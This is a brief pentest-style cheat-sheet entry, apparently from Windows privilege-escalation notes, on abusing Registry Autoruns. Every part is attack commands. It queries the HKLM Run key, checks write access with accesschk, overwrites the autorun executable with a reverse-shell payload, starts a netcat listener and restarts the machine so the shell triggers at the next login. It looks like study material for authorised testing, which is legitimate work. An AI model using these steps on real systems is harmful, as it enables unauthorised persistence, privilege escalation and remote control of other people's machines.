# Registry - Autoruns

Run the following command

`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

If the output shows a path, check if the path is writable.

`accesschk.exe /accepteula -wvu "<path to exe"`

Example

`accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it

`copy reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`

Start a listener

`nc -lvp 4444`

Restart the machine

`shutdown /s`

When a user attempts to login, the reverse shell will be triggered.